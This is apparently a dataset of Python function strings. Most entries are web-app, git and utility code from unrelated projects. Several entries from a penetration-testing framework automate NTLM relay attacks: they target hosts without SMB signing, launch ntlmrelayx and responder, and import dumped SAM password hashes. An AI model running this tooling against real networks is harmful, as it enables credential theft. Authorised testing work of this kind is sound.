            "def make_coins(self, collection, text, subreference=\"\", lang=None):\n        \"\"\" Creates a CoINS Title string from information\n\n        :param collection: Collection to create coins from\n        :param text: Text/Passage object\n        :param subreference: Subreference\n        :param lang: Locale information\n        :return: Coins HTML title value\n        \"\"\"\n        if lang is None:\n            lang = self.__default_lang__\n        return \"url_ver=Z39.88-2004\"\\\n                 \"&ctx_ver=Z39.88-2004\"\\\n                 \"&rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook\"\\\n                 \"&rft_id={cid}\"\\\n                 \"&rft.genre=bookitem\"\\\n                 \"&rft.btitle={title}\"\\\n                 \"&rft.edition={edition}\"\\\n                 \"&rft.au={author}\"\\\n                 \"&rft.atitle={pages}\"\\\n                 \"&rft.language={language}\"\\\n                 \"&rft.pages={pages}\".format(\n                    title=quote(str(text.get_title(lang))), author=quote(str(text.get_creator(lang))),\n                    cid=url_for(\".r_collection\", objectId=collection.id, _external=True),\n                    language=collection.lang, pages=quote(subreference), edition=quote(str(text.get_description(lang)))\n                 )"
        ],
        [
            "def expose_ancestors_or_children(self, member, collection, lang=None):\n        \"\"\" Build an ancestor or descendant dict view based on selected information\n\n        :param member: Current Member to build for\n        :param collection: Collection from which we retrieved it\n        :param lang: Language to express data in\n        :return:\n        \"\"\"\n        x = {\n            \"id\": member.id,\n            \"label\": str(member.get_label(lang)),\n            \"model\": str(member.model),\n            \"type\": str(member.type),\n            \"size\": member.size,\n            \"semantic\": self.semantic(member, parent=collection)\n        }\n        if isinstance(member, ResourceCollection):\n            x[\"lang\"] = str(member.lang)\n        return x"
        ],
        [
            "def make_members(self, collection, lang=None):\n        \"\"\" Build member list for given collection\n\n        :param collection: Collection to build dict view of for its members\n        :param lang: Language to express data in\n        :return: List of basic objects\n        \"\"\"\n        objects = sorted([\n                self.expose_ancestors_or_children(member, collection, lang=lang)\n                for member in collection.members\n                if member.get_label()\n            ],\n            key=itemgetter(\"label\")\n        )\n        return objects"
        ],
        [
            "def make_parents(self, collection, lang=None):\n        \"\"\" Build parents list for given collection\n\n        :param collection: Collection to build dict view of for its members\n        :param lang: Language to express data in\n        :return: List of basic objects\n        \"\"\"\n        return [\n            {\n                \"id\": member.id,\n                \"label\": str(member.get_label(lang)),\n                \"model\": str(member.model),\n                \"type\": str(member.type),\n                \"size\": member.size\n            }\n            for member in collection.parents\n            if member.get_label()\n        ]"
        ],
        [
            "def r_collections(self, lang=None):\n        \"\"\" Retrieve the top collections of the inventory\n\n        :param lang: Lang in which to express main data\n        :type lang: str\n        :return: Collections information and template\n        :rtype: {str: Any}\n        \"\"\"\n        collection = self.resolver.getMetadata()\n        return {\n            \"template\": \"main::collection.html\",\n            \"current_label\": collection.get_label(lang),\n            \"collections\": {\n                \"members\": self.make_members(collection, lang=lang)\n            }\n        }"
        ],
        [
            "def r_collection(self, objectId, lang=None):\n        \"\"\" Collection content browsing route function\n\n        :param objectId: Collection identifier\n        :type objectId: str\n        :param lang: Lang in which to express main data\n        :type lang: str\n        :return: Template and collections contained in given collection\n        :rtype: {str: Any}\n        \"\"\"\n        collection = self.resolver.getMetadata(objectId)\n        return {\n            \"template\": \"main::collection.html\",\n            \"collections\": {\n                \"current\": {\n                    \"label\": str(collection.get_label(lang)),\n                    \"id\": collection.id,\n                    \"model\": str(collection.model),\n                    \"type\": str(collection.type),\n                },\n                \"members\": self.make_members(collection, lang=lang),\n                \"parents\": self.make_parents(collection, lang=lang)\n            },\n        }"
        ],
        [
            "def r_references(self, objectId, lang=None):\n        \"\"\" Text exemplar references browsing route function\n\n        :param objectId: Collection identifier\n        :type objectId: str\n        :param lang: Lang in which to express main data\n        :type lang: str\n        :return: Template and required information about text with its references\n        \"\"\"\n        collection, reffs = self.get_reffs(objectId=objectId, export_collection=True)\n        return {\n            \"template\": \"main::references.html\",\n            \"objectId\": objectId,\n            \"citation\": collection.citation,\n            \"collections\": {\n                \"current\": {\n                    \"label\": collection.get_label(lang),\n                    \"id\": collection.id,\n                    \"model\": str(collection.model),\n                    \"type\": str(collection.type),\n                },\n                \"parents\": self.make_parents(collection, lang=lang)\n            },\n            \"reffs\": reffs\n        }"
        ],
        [
            "def r_first_passage(self, objectId):\n        \"\"\" Provides a redirect to the first passage of given objectId\n\n        :param objectId: Collection identifier\n        :type objectId: str\n        :return: Redirection to the first passage of given text\n        \"\"\"\n        collection, reffs = self.get_reffs(objectId=objectId, export_collection=True)\n        first, _ = reffs[0]\n        return redirect(\n            url_for(\".r_passage_semantic\", objectId=objectId, subreference=first, semantic=self.semantic(collection))\n        )"
        ],
        [
            "def r_passage(self, objectId, subreference, lang=None):\n        \"\"\" Retrieve the text of the passage\n\n        :param objectId: Collection identifier\n        :type objectId: str\n        :param lang: Lang in which to express main data\n        :type lang: str\n        :param subreference: Reference identifier\n        :type subreference: str\n        :return: Template, collections metadata and Markup object representing the text\n        :rtype: {str: Any}\n        \"\"\"\n        collection = self.get_collection(objectId)\n        if isinstance(collection, CtsWorkMetadata):\n            editions = [t for t in collection.children.values() if isinstance(t, CtsEditionMetadata)]\n            if len(editions) == 0:\n                raise UnknownCollection(\"This work has no default edition\")\n            return redirect(url_for(\".r_passage\", objectId=str(editions[0].id), subreference=subreference))\n        text = self.get_passage(objectId=objectId, subreference=subreference)\n        passage = self.transform(text, text.export(Mimetypes.PYTHON.ETREE), objectId)\n        prev, next = self.get_siblings(objectId, subreference, text)\n        return {\n            \"template\": \"main::text.html\",\n            \"objectId\": objectId,\n            \"subreference\": subreference,\n            \"collections\": {\n                \"current\": {\n                    \"label\": collection.get_label(lang),\n                    \"id\": collection.id,\n                    \"model\": str(collection.model),\n                    \"type\": str(collection.type),\n                    \"author\": text.get_creator(lang),\n                    \"title\": text.get_title(lang),\n                    \"description\": text.get_description(lang),\n                    \"citation\": collection.citation,\n                    \"coins\": self.make_coins(collection, text, subreference, lang=lang)\n                },\n                \"parents\": self.make_parents(collection, lang=lang)\n            },\n            \"text_passage\": Markup(passage),\n            \"prev\": prev,\n            \"next\": next\n        }"
        ],
        [
            "def r_assets(self, filetype, asset):\n        \"\"\" Route for specific assets.\n\n        :param filetype: Asset Type\n        :param asset: Filename of an asset\n        :return: Response\n        \"\"\"\n        if filetype in self.assets and asset in self.assets[filetype] and self.assets[filetype][asset]:\n            return send_from_directory(\n                directory=self.assets[filetype][asset],\n                filename=asset\n            )\n        abort(404)"
        ],
        [
            "def register_assets(self):\n        \"\"\" Merge and register assets, both as routes and dictionary\n\n        :return: None\n        \"\"\"\n        self.blueprint.add_url_rule(\n            # Register another path to ensure assets compatibility\n            \"{0}.secondary/<filetype>/<asset>\".format(self.static_url_path),\n            view_func=self.r_assets,\n            endpoint=\"secondary_assets\",\n            methods=[\"GET\"]\n        )"
        ],
        [
            "def create_blueprint(self):\n        \"\"\" Create blueprint and register rules\n\n        :return: Blueprint of the current nemo app\n        :rtype: flask.Blueprint\n        \"\"\"\n        self.register_plugins()\n\n        self.blueprint = Blueprint(\n            self.name,\n            \"nemo\",\n            url_prefix=self.prefix,\n            template_folder=self.template_folder,\n            static_folder=self.static_folder,\n            static_url_path=self.static_url_path\n        )\n\n        for url, name, methods, instance in self._urls:\n            self.blueprint.add_url_rule(\n                url,\n                view_func=self.view_maker(name, instance),\n                endpoint=_plugin_endpoint_rename(name, instance),\n                methods=methods\n            )\n\n        for url, name, methods, instance in self._semantic_url:\n            self.blueprint.add_url_rule(\n                url,\n                view_func=self.view_maker(name, instance),\n                endpoint=_plugin_endpoint_rename(name, instance)+\"_semantic\",\n                methods=methods\n            )\n\n        self.register_assets()\n        self.register_filters()\n\n        # We extend the loading list by the instance value\n        self.__templates_namespaces__.extend(self.__instance_templates__)\n        # We generate a template loader\n        for namespace, directory in self.__templates_namespaces__[::-1]:\n            if namespace not in self.__template_loader__:\n                self.__template_loader__[namespace] = []\n            self.__template_loader__[namespace].append(\n                jinja2.FileSystemLoader(op.abspath(directory))\n            )\n        self.blueprint.jinja_loader = jinja2.PrefixLoader(\n            {namespace: jinja2.ChoiceLoader(paths) for namespace, paths in self.__template_loader__.items()},\n            \"::\"\n        )\n\n        if self.cache is not None:\n            for func, instance in self.cached:\n                setattr(instance, func.__name__, self.cache.memoize()(func))\n\n        return self.blueprint"
        ],
        [
            "def view_maker(self, name, instance=None):\n        \"\"\" Create a view\n\n        :param name: Name of the route function to use for the view.\n        :type name: str\n        :return: Route function which makes use of Nemo context (such as menu informations)\n        :rtype: function\n        \"\"\"\n        if instance is None:\n            instance = self\n        sig = \"lang\" in [\n            parameter.name\n            for parameter in inspect.signature(getattr(instance, name)).parameters.values()\n        ]\n\n        def route(**kwargs):\n            if sig and \"lang\" not in kwargs:\n                kwargs[\"lang\"] = self.get_locale()\n            if \"semantic\" in kwargs:\n                del kwargs[\"semantic\"]\n            return self.route(getattr(instance, name), **kwargs)\n        return route"
        ],
        [
            "def main_collections(self, lang=None):\n        \"\"\" Retrieve main parent collections of a repository\n\n        :param lang: Language to retrieve information in\n        :return: Sorted collections representations\n        \"\"\"\n        return sorted([\n            {\n                \"id\": member.id,\n                \"label\": str(member.get_label(lang=lang)),\n                \"model\": str(member.model),\n                \"type\": str(member.type),\n                \"size\": member.size\n            }\n            for member in self.resolver.getMetadata().members\n        ], key=itemgetter(\"label\"))"
        ],
        [
            "def make_cache_keys(self, endpoint, kwargs):\n        \"\"\" This function is built to provide cache keys for templates\n\n        :param endpoint: Current endpoint\n        :param kwargs: Keyword Arguments\n        :return: tuple of i18n dependant cache key and i18n ignoring cache key\n        :rtype: tuple(str)\n        \"\"\"\n        keys = sorted(kwargs.keys())\n        i18n_cache_key = endpoint+\"|\"+\"|\".join([kwargs[k] for k in keys])\n        if \"lang\" in keys:\n            cache_key = endpoint+\"|\" + \"|\".join([kwargs[k] for k in keys if k != \"lang\"])\n        else:\n            cache_key = i18n_cache_key\n        return i18n_cache_key, cache_key"
        ],
        [
            "def render(self, template, **kwargs):\n        \"\"\" Render a route template and adds information to this route.\n\n        :param template: Template name.\n        :type template: str\n        :param kwargs: dictionary of named arguments used to be passed to the template\n        :type kwargs: dict\n        :return: Http Response with rendered template\n        :rtype: flask.Response\n        \"\"\"\n\n        kwargs[\"cache_key\"] = \"%s\" % kwargs[\"url\"].values()\n        kwargs[\"lang\"] = self.get_locale()\n        kwargs[\"assets\"] = self.assets\n        kwargs[\"main_collections\"] = self.main_collections(kwargs[\"lang\"])\n        kwargs[\"cache_active\"] = self.cache is not None\n        kwargs[\"cache_time\"] = 0\n        kwargs[\"cache_key\"], kwargs[\"cache_key_i18n\"] = self.make_cache_keys(request.endpoint, kwargs[\"url\"])\n        kwargs[\"template\"] = template\n\n        for plugin in self.__plugins_render_views__:\n            kwargs.update(plugin.render(**kwargs))\n\n        return render_template(kwargs[\"template\"], **kwargs)"
        ],
        [
            "def register(self):\n        \"\"\" Register the app using Blueprint\n\n        :return: Nemo blueprint\n        :rtype: flask.Blueprint\n        \"\"\"\n        if self.app is not None:\n            if not self.blueprint:\n                self.blueprint = self.create_blueprint()\n            self.app.register_blueprint(self.blueprint)\n            if self.cache is None:\n                # We register a fake cache extension.\n                setattr(self.app.jinja_env, \"_fake_cache_extension\", self)\n                self.app.jinja_env.add_extension(FakeCacheExtension)\n            return self.blueprint\n        return None"
        ],
        [
            "def register_filters(self):\n        \"\"\" Register filters for Jinja to use\n\n       .. note::  Extends the dictionary filters of jinja_env using self._filters list\n        \"\"\"\n        for _filter, instance in self._filters:\n            if not instance:\n                self.app.jinja_env.filters[\n                    _filter.replace(\"f_\", \"\")\n                ] = getattr(flask_nemo.filters, _filter)\n            else:\n                self.app.jinja_env.filters[\n                    _filter.replace(\"f_\", \"\")\n                ] = getattr(instance, _filter.replace(\"_{}\".format(instance.name), \"\"))"
        ],
        [
            "def register_plugins(self):\n        \"\"\" Register plugins in Nemo instance\n\n        - Clear routes first if asked by one plugin\n        - Clear assets if asked by one plugin and replace by the last plugin registered static_folder\n        - Register each plugin\n            - Append plugin routes to registered routes\n            - Append plugin filters to registered filters\n            - Append templates directory to given namespaces\n            - Append assets (CSS, JS, statics) to given resources \n            - Append render view (if exists) to Nemo.render stack\n        \"\"\"\n        if len([plugin for plugin in self.__plugins__.values() if plugin.clear_routes]) > 0:  # Clear current routes\n            self._urls = list()\n            self.cached = list()\n\n        clear_assets = [plugin for plugin in self.__plugins__.values() if plugin.clear_assets]\n        if len(clear_assets) > 0 and not self.prevent_plugin_clearing_assets:  # Clear current Assets\n            self.__assets__ = copy(type(self).ASSETS)\n            static_path = [plugin.static_folder for plugin in clear_assets if plugin.static_folder]\n            if len(static_path) > 0:\n                self.static_folder = static_path[-1]\n\n        for plugin in self.__plugins__.values():\n            self._urls.extend([(url, function, methods, plugin) for url, function, methods in plugin.routes])\n            self._filters.extend([(filt, plugin) for filt in plugin.filters])\n            self.__templates_namespaces__.extend(\n                [(namespace, directory) for namespace, directory in plugin.templates.items()]\n            )\n            for asset_type in self.__assets__:\n                for key, value in plugin.assets[asset_type].items():\n                    self.__assets__[asset_type][key] = value\n            if plugin.augment:\n                self.__plugins_render_views__.append(plugin)\n\n            if hasattr(plugin, \"CACHED\"):\n                for func in plugin.CACHED:\n                    self.cached.append((getattr(plugin, func), plugin))\n            plugin.register_nemo(self)"
        ],
        [
            "def chunk(self, text, reffs):\n        \"\"\" Handle a list of references depending on the text identifier using the chunker dictionary.\n\n        :param text: Text object from which comes the references\n        :type text: MyCapytains.resources.texts.api.Text\n        :param reffs: List of references to transform\n        :type reffs: References\n        :return: Transformed list of references\n        :rtype: [str]\n        \"\"\"\n        if str(text.id) in self.chunker:\n            return self.chunker[str(text.id)](text, reffs)\n        return self.chunker[\"default\"](text, reffs)"
        ],
        [
            "def add_tag():\n    \"\"\"\n        Obtains the data from the pipe and appends the given tag.\n    \"\"\"\n    if len(sys.argv) > 1:\n        tag = sys.argv[1]\n        doc_mapper = DocMapper()\n        if doc_mapper.is_pipe:\n            count = 0\n            for obj in doc_mapper.get_pipe():\n                obj.add_tag(tag)\n                obj.update(tags=obj.tags)\n                count += 1\n            print_success(\"Added tag '{}' to {} object(s)\".format(tag, count))\n        else:\n            print_error(\"Please use this script with pipes\")\n    else:\n        print_error(\"Usage: jk-add-tag <tag>\")\n        sys.exit()"
        ],
        [
            "def set(self, section, key, value):\n        \"\"\"\n            Creates the section value if it does not exists and sets the value.\n            Use write_config to actually set the value.\n        \"\"\"\n        if not section in self.config:\n            self.config.add_section(section)\n        self.config.set(section, key, value)"
        ],
        [
            "def get(self, section, key):\n        \"\"\"\n            This function tries to retrieve the value from the configfile\n            otherwise will return a default.\n        \"\"\"\n        try:\n            return self.config.get(section, key)\n        except configparser.NoSectionError:\n            pass\n        except configparser.NoOptionError:\n            pass\n        return self.defaults[section][key]"
        ],
        [
            "def config_dir(self):\n        \"\"\"\n            Returns the configuration directory\n        \"\"\"\n        home = expanduser('~')\n        config_dir = os.path.join(home, '.jackal')\n        return config_dir"
        ],
        [
            "def write_config(self, initialize_indices=False):\n        \"\"\"\n            Write the current config to disk to store them.\n        \"\"\"\n        if not os.path.exists(self.config_dir):\n            os.mkdir(self.config_dir)\n\n        with open(self.config_file, 'w') as configfile:\n            self.config.write(configfile)\n\n        if initialize_indices:\n            index = self.get('jackal', 'index')\n            from jackal import Host, Range, Service, User, Credential, Log\n            from jackal.core import create_connection\n            create_connection(self)\n            Host.init(index=\"{}-hosts\".format(index))\n            Range.init(index=\"{}-ranges\".format(index))\n            Service.init(index=\"{}-services\".format(index))\n            User.init(index=\"{}-users\".format(index))\n            Credential.init(index=\"{}-creds\".format(index))\n            Log.init(index=\"{}-log\".format(index))"
        ],
        [
            "def ensure_remote_branch_is_tracked(branch):\n    \"\"\"Track the specified remote branch if it is not already tracked.\"\"\"\n    if branch == MASTER_BRANCH:\n        # We don't need to explicitly track the master branch, so we're done.\n        return\n\n    # Ensure the specified branch is in the local branch list.\n    output = subprocess.check_output(['git', 'branch', '--list'])\n    for line in output.split('\\n'):\n        if line.strip() == branch:\n            # We are already tracking the remote branch\n            break\n    else:\n        # We are not tracking the remote branch, so track it.\n        try:\n            sys.stdout.write(subprocess.check_output(\n                ['git', 'checkout', '--track', 'origin/%s' % branch]))\n        except subprocess.CalledProcessError:\n            # Bail gracefully.\n            raise SystemExit(1)"
        ],
        [
            "def main(branch):\n    \"\"\"Checkout, update and branch from the specified branch.\"\"\"\n    try:\n        # Ensure that we're in a git repository. This command is silent unless\n        # you're not actually in a git repository, in which case, you receive a\n        # \"Not a git repository\" error message.\n        output = subprocess.check_output(['git', 'rev-parse']).decode('utf-8')\n        sys.stdout.write(output)\n    except subprocess.CalledProcessError:\n        # Bail if we're not in a git repository.\n        return\n\n    # This behavior ensures a better user experience for those that aren't\n    # intimately familiar with git.\n    ensure_remote_branch_is_tracked(branch)\n\n    # Switch to the specified branch and update it.\n    subprocess.check_call(['git', 'checkout', '--quiet', branch])\n\n    # Pulling is always safe here, because we never commit to this branch.\n    subprocess.check_call(['git', 'pull', '--quiet'])\n\n    # Checkout the top commit in the branch, effectively going \"untracked.\"\n    subprocess.check_call(['git', 'checkout', '--quiet', '%s~0' % branch])\n\n    # Clean up the repository of Python cruft. Because we've just switched\n    # branches and compiled Python files should not be version controlled,\n    # there are likely leftover compiled Python files sitting on disk which may\n    # confuse some tools, such as sqlalchemy-migrate.\n    subprocess.check_call(['find', '.', '-name', '\"*.pyc\"', '-delete'])\n\n    # For the sake of user experience, give some familiar output.\n    print('Your branch is up to date with branch \\'origin/%s\\'.' % branch)"
        ],
        [
            "def get_interface_name():\n    \"\"\"\n        Returns the interface name of the first not link_local and not loopback interface.\n    \"\"\"\n    interface_name = ''\n    interfaces = psutil.net_if_addrs()\n    for name, details in interfaces.items():\n        for detail in details:\n            if detail.family == socket.AF_INET:\n                ip_address = ipaddress.ip_address(detail.address)\n                if not (ip_address.is_link_local or ip_address.is_loopback):\n                    interface_name = name\n                    break\n    return interface_name"
        ],
        [
            "def load_targets(self):\n        \"\"\"\n            load_targets will load the services with smb signing disabled and if ldap is enabled the services with the ldap port open.\n        \"\"\"\n        ldap_services = []\n        if self.ldap:\n            ldap_services = self.search.get_services(ports=[389], up=True)\n\n        self.ldap_strings = [\"ldap://{}\".format(service.address) for service in ldap_services]\n        self.services = self.search.get_services(tags=['smb_signing_disabled'])\n        self.ips = [str(service.address) for service in self.services]"
        ],
        [
            "def write_targets(self):\n        \"\"\"\n            write_targets will write the contents of ips and ldap_strings to the targets_file.\n        \"\"\"\n        if len(self.ldap_strings) == 0 and len(self.ips) == 0:\n            print_notification(\"No targets left\")\n            if self.auto_exit:\n                if self.notifier:\n                    self.notifier.stop()\n                self.terminate_processes()\n\n        with open(self.targets_file, 'w') as f:\n            f.write('\\n'.join(self.ldap_strings + self.ips))"
        ],
        [
            "def start_processes(self):\n        \"\"\"\n            Starts the ntlmrelayx.py and responder processes.\n            Assumes you have these programs in your path.\n        \"\"\"\n        self.relay = subprocess.Popen(['ntlmrelayx.py', '-6', '-tf', self.targets_file, '-w', '-l', self.directory, '-of', self.output_file], cwd=self.directory)\n        self.responder = subprocess.Popen(['responder', '-I', self.interface_name])"
        ],
        [
            "def callback(self, event):\n        \"\"\"\n            Function that gets called on each event from pyinotify.\n        \"\"\"\n        # IN_CLOSE_WRITE -> 0x00000008\n        if event.mask == 0x00000008:\n            if event.name.endswith('.json'):\n                print_success(\"Ldapdomaindump file found\")\n                if event.name in ['domain_groups.json', 'domain_users.json']:\n                    if event.name == 'domain_groups.json':\n                        self.domain_groups_file = event.pathname\n                    if event.name == 'domain_users.json':\n                        self.domain_users_file = event.pathname\n                    if self.domain_groups_file and self.domain_users_file:\n                        print_success(\"Importing users\")\n                        subprocess.Popen(['jk-import-domaindump', self.domain_groups_file, self.domain_users_file])\n                elif event.name == 'domain_computers.json':\n                    print_success(\"Importing computers\")\n                    subprocess.Popen(['jk-import-domaindump', event.pathname])\n\n                # Ldap has been dumped, so remove the ldap targets.\n                self.ldap_strings = []\n                self.write_targets()\n\n            if event.name.endswith('_samhashes.sam'):\n                host = event.name.replace('_samhashes.sam', '')\n                # TODO import file.\n                print_success(\"Secretsdump file, host ip: {}\".format(host))\n                subprocess.Popen(['jk-import-secretsdump', event.pathname])\n\n                # Remove this system from this ip list.\n                self.ips.remove(host)\n                self.write_targets()"
        ],
        [
            "def watch(self):\n        \"\"\"\n            Watches directory for changes\n        \"\"\"\n        wm = pyinotify.WatchManager()\n        self.notifier = pyinotify.Notifier(wm, default_proc_fun=self.callback)\n        wm.add_watch(self.directory, pyinotify.ALL_EVENTS)\n        try:\n            self.notifier.loop()\n        except (KeyboardInterrupt, AttributeError):\n            print_notification(\"Stopping\")\n        finally:\n            self.notifier.stop()\n            self.terminate_processes()"
        ],
        [
            "def terminate_processes(self):\n        \"\"\"\n            Terminate the processes.\n        \"\"\"\n        if self.relay:\n            self.relay.terminate()\n        if self.responder:\n            self.responder.terminate()"
        ],
        [
            "def wait(self):\n        \"\"\"\n            This function waits for the relay and responding processes to exit.\n            Captures KeyboardInterrupt to shutdown these processes.\n        \"\"\"\n        try:\n            self.relay.wait()\n            self.responder.wait()\n        except KeyboardInterrupt:\n            print_notification(\"Stopping\")\n        finally:\n            self.terminate_processes()"
        ],
        [
            "def getAnnotations(self, targets, wildcard=\".\", include=None, exclude=None, limit=None, start=1, expand=False,\n                       **kwargs):\n        \"\"\" Retrieve annotations from the query provider\n\n        :param targets: The CTS URN(s) to query as the target of annotations\n        :type targets: [MyCapytain.common.reference.URN], URN or None\n        :param wildcard: Wildcard specifier for how to match the URN\n        :type wildcard: str\n        :param include: URI(s) of Annotation types to include in the results\n        :type include: list(str)\n        :param exclude: URI(s) of Annotation types to include in the results\n        :type exclude: list(str)\n        :param limit: The max number of results to return (Default is None for no limit)\n        :type limit: int\n        :param start: the starting record to return (Default is 1)\n        :type start: int \n        :param expand: Flag to state whether Annotations are expanded (Default is False)\n        :type expand: bool\n    \n        :return: Tuple representing the query results. The first element\n                 The first element is the number of total Annotations found\n                 The second element is the list of Annotations\n        :rtype: (int, list(Annotation)\n\n        .. note::\n\n            Wildcard should be one of the following value\n\n            - '.' to match exact,\n            - '.%' to match exact plus lower in the hierarchy\n            - '%.' to match exact + higher in the hierarchy\n            - '-' to match in the range\n            - '%.%' to match all\n\n        \"\"\"\n        return 0, []"
        ],
        [
            "def render(self, **kwargs):\n        \"\"\" Make breadcrumbs for a route\n\n        :param kwargs: dictionary of named arguments used to construct the view\n        :type kwargs: dict\n        :return: List of dict items the view can use to construct the link.\n        :rtype: {str: list({ \"link\": str, \"title\", str, \"args\", dict})}\n        \"\"\"\n        breadcrumbs = []\n        # this is the list of items we want to accumulate in the breadcrumb trail.\n        # item[0] is the key into the kwargs[\"url\"] object and item[1] is the  name of the route\n        # setting a route name to None means that it's needed to construct the route of the next item in the list\n        # but shouldn't be included in the list itself (this is currently the case for work --\n        # at some point we probably should include work in the navigation)\n        breadcrumbs = []\n        if \"collections\" in kwargs:\n            breadcrumbs = [{\n                \"title\": \"Text Collections\",\n                \"link\": \".r_collections\",\n                \"args\": {}\n            }]\n\n            if \"parents\" in kwargs[\"collections\"]:\n                breadcrumbs += [\n                        {\n                            \"title\": parent[\"label\"],\n                            \"link\": \".r_collection_semantic\",\n                            \"args\": {\n                                \"objectId\": parent[\"id\"],\n                                \"semantic\": f_slugify(parent[\"label\"]),\n                            },\n                        }\n                        for parent in kwargs[\"collections\"][\"parents\"]\n                  ][::-1]\n\n            if \"current\" in kwargs[\"collections\"]:\n                breadcrumbs.append({\n                    \"title\": kwargs[\"collections\"][\"current\"][\"label\"],\n                    \"link\": None,\n                    \"args\": {}\n                })\n\n        # don't link the last item in the trail\n        if len(breadcrumbs) > 0:\n            breadcrumbs[-1][\"link\"] = None\n\n        return {\"breadcrumbs\": breadcrumbs}"
        ],
        [
            "def main():\n    \"\"\"\n        This function obtains hosts from core and starts a nessus scan on these hosts.\n        The nessus tag is appended to the host tags.\n    \"\"\"\n    config = Config()\n    core = HostSearch()\n    hosts = core.get_hosts(tags=['!nessus'], up=True)\n    hosts = [host for host in hosts]\n    host_ips = \",\".join([str(host.address) for host in hosts])\n\n    url = config.get('nessus', 'host')\n    access = config.get('nessus', 'access_key')\n    secret = config.get('nessus', 'secret_key')\n    template_name = config.get('nessus', 'template_name')\n\n    nessus = Nessus(access, secret, url, template_name)\n\n    scan_id = nessus.create_scan(host_ips)\n    nessus.start_scan(scan_id)\n\n    for host in hosts:\n        host.add_tag('nessus')\n        host.save()\n\n    Logger().log(\"nessus\", \"Nessus scan started on {} hosts\".format(len(hosts)), {'scanned_hosts': len(hosts)})"
        ],
        [
            "def get_template_uuid(self):\n        \"\"\"\n            Retrieves the uuid of the given template name.\n        \"\"\"\n        response = requests.get(self.url + 'editor/scan/templates', headers=self.headers, verify=False)\n        templates = json.loads(response.text)\n        for template in templates['templates']:\n            if template['name'] == self.template_name:\n                return template['uuid']"
        ],
        [
            "def create_scan(self, host_ips):\n        \"\"\"\n            Creates a scan with the given host ips\n            Returns the scan id of the created object.\n        \"\"\"\n        now = datetime.datetime.now()\n        data = {\n            \"uuid\": self.get_template_uuid(),\n            \"settings\": {\n                \"name\": \"jackal-\" + now.strftime(\"%Y-%m-%d %H:%M\"),\n                \"text_targets\": host_ips\n            }\n        }\n        response = requests.post(self.url + 'scans', data=json.dumps(data), verify=False, headers=self.headers)\n        if response:\n            result = json.loads(response.text)\n            return result['scan']['id']"
        ],
        [
            "def start_scan(self, scan_id):\n        \"\"\"\n            Starts the scan identified by the scan_id.s\n        \"\"\"\n        requests.post(self.url + 'scans/{}/launch'.format(scan_id), verify=False, headers=self.headers)"
        ],
        [
            "def cmpToDataStore_uri(base, ds1, ds2):\n  '''Bases the comparison of the datastores on URI alone.'''\n  ret = difflib.get_close_matches(base.uri, [ds1.uri, ds2.uri], 1, cutoff=0.5)\n  if len(ret) <= 0:\n    return 0\n  if ret[0] == ds1.uri:\n    return -1\n  return 1"
        ],
        [
            "def add_tag(self, tag):\n        \"\"\"\n            Adds a tag to the list of tags and makes sure the result list contains only unique results.\n        \"\"\"\n        self.tags = list(set(self.tags or []) | set([tag]))"
        ],
        [
            "def remove_tag(self, tag):\n        \"\"\"\n            Removes a tag from this object\n        \"\"\"\n        self.tags = list(set(self.tags or []) - set([tag]))"
        ],
        [
            "def to_dict(self, include_meta=False):\n        \"\"\"\n            Returns the result as a dictionary, provide the include_meta flag to als show information like index and doctype.\n        \"\"\"\n        result = super(JackalDoc, self).to_dict(include_meta=include_meta)\n        if include_meta:\n            source = result.pop('_source')\n            return {**result, **source}\n        else:\n            return result"
        ],
        [
            "def r_annotations(self):\n        \"\"\" Route to retrieve annotations by target\n\n        :param target_urn: The CTS URN for which to retrieve annotations  \n        :type target_urn: str\n        :return: a JSON string containing count and list of resources\n        :rtype: {str: Any}\n        \"\"\"\n\n        target = request.args.get(\"target\", None)\n        wildcard = request.args.get(\"wildcard\", \".\", type=str)\n        include = request.args.get(\"include\")\n        exclude = request.args.get(\"exclude\")\n        limit = request.args.get(\"limit\", None, type=int)\n        start = request.args.get(\"start\", 1, type=int)\n        expand = request.args.get(\"expand\", False, type=bool)\n\n        if target:\n\n            try:\n                urn = MyCapytain.common.reference.URN(target)\n            except ValueError:\n                return \"invalid urn\", 400\n\n            count, annotations = self.__queryinterface__.getAnnotations(urn, wildcard=wildcard, include=include,\n                                                                        exclude=exclude, limit=limit, start=start,\n                                                                        expand=expand)\n        else:\n            #  Note that this implementation is not done for too much annotations\n            #  because we do not implement pagination here\n            count, annotations = self.__queryinterface__.getAnnotations(None, limit=limit, start=start, expand=expand)\n        mapped = []\n        response = {\n            \"@context\": type(self).JSONLD_CONTEXT,\n            \"id\": url_for(\".r_annotations\", start=start, limit=limit),\n            \"type\": \"AnnotationCollection\",\n            \"startIndex\": start,\n            \"items\": [\n            ],\n            \"total\": count\n        }\n        for a in annotations:\n            mapped.append({\n                \"id\": url_for(\".r_annotation\", sha=a.sha),\n                \"body\": url_for(\".r_annotation_body\", sha=a.sha),\n                \"type\": \"Annotation\",\n                \"target\": a.target.to_json(),\n                \"dc:type\": a.type_uri,\n                \"owl:sameAs\": [a.uri],\n                \"nemo:slug\": a.slug\n            })\n        response[\"items\"] = mapped\n        response = jsonify(response)\n        return response"
        ],
        [
            "def lookup(cls, key, get=False):\n        \"\"\"Returns the label for a given Enum key\"\"\"\n        if get:\n            item = cls._item_dict.get(key)\n            return item.name if item else key\n        return cls._item_dict[key].name"
        ],
        [
            "def verbose(cls, key=False, default=''):\n        \"\"\"Returns the verbose name for a given enum value\"\"\"\n        if key is False:\n            items = cls._item_dict.values()\n            return [(x.key, x.value) for x in sorted(items, key=lambda x:x.sort or x.key)]\n\n        item = cls._item_dict.get(key)\n        return item.value if item else default"
        ],
        [
            "def get_configured_dns():\n    \"\"\"\n        Returns the configured DNS servers with the use f nmcli.\n    \"\"\"\n    ips = []\n    try:\n        output = subprocess.check_output(['nmcli', 'device', 'show'])\n        output = output.decode('utf-8')\n\n        for line in output.split('\\n'):\n            if 'DNS' in line:\n                pattern = r\"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\"\n                for hit in re.findall(pattern, line):\n                    ips.append(hit)\n    except FileNotFoundError:\n        pass\n    return ips"
        ],
        [
